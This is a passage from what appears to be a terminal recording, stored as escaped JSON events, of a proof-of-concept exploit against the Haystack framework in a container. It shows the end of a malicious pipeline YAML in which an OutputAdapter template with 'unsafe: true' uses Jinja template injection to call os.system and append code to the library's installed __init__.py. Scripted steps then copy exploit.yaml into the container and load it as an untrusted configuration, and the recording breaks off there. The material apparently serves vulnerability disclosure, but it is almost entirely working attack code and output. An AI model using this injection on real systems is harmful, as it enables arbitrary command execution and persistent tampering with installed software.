verters.output_adapter.OutputAdapter\\r\\n    init_parameters:\\r\\n      template: |\\r\\n        {{ trigger }}{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).system(\u0026#39;echo \\\u0026quot;print(\\\\\\\u0026quot;\\\\\\\\\\\\\\\u0026quot;!!! NUKA-AI YAML SCOPE CHANGE: 10.0 CRITICAL !!!\\\\\\\\\\\\\\\u0026quot;\\\\\\\u0026quot;)\\\u0026quot; \u0026gt;\u0026gt; /usr/local/lib/python3.11/site-packages/haystack/__init__.py\u0026#39;) }}\\r\\n      output_type: str\\r\\n      unsafe: true\\r\\nconnections: []\\r\\ninputs: {}\\r\\noutputs: {}\\r\\n\u0026quot;]","[38.546542, \u0026quot;o\u0026quot;, \u0026quot;+ docker cp exploit.yaml haystack-instance:/tmp/exploit.yaml\\r\\n\u0026quot;]","[38.580915, \u0026quot;o\u0026quot;, \u0026quot;Successfully copied 2.05kB to haystack-instance:/tmp/exploit.yaml\\r\\n\u0026quot;]","[38.585696, \u0026quot;o\u0026quot;, \u0026quot;+ echo -e \u0026#39;\\\\e[1;32m\u0026gt;\u0026gt;\u0026gt; [STEP 3] Verifying Clean System State\\\\e[0m\u0026#39;\u0026quot;]","[38.586345, \u0026quot;o\u0026quot;, \u0026quot;\\r\\n\u0026quot;]","[38.58647, \u0026quot;o\u0026quot;, \u0026quot;\\u001b[1;32m\u0026gt;\u0026gt;\u0026gt; [STEP 3] Verifying Clean System State\\u001b[0m\\r\\n+ docker exec haystack-instance python3 -c \u0026#39;import haystack; print(\u0026#39;\\\\\u0026#39;\u0026#39;STATUS: Framework is untainted.\u0026#39;\\\\\u0026#39;\u0026#39;)\u0026#39;\u0026quot;]","[38.586522, \u0026quot;o\u0026quot;, \u0026quot;\\r\\n\u0026quot;]","[39.571143, \u0026quot;o\u0026quot;, \u0026quot;STATUS: Framework is untainted.\\r\\n\u0026quot;]","[39.690977, \u0026quot;o\u0026quot;, \u0026quot;+ echo -e \u0026#39;\\\\e[1;31m\u0026gt;\u0026gt;\u0026gt; [STEP 4] Victim App: Loading Untrusted YAML Configuration\\\\e[0m\u0026#39;\\r\\n\u0026quot;]","[39.691296, \u0026quot;o\u0026quot;, \u0026quot;\\u001b[1;31m\u0026gt;\u0026gt;\u0026gt; [STEP 4] Victim App: Loading Untrusted YAML Configuration\\u001b[0m\u0026quot;]","[39.69156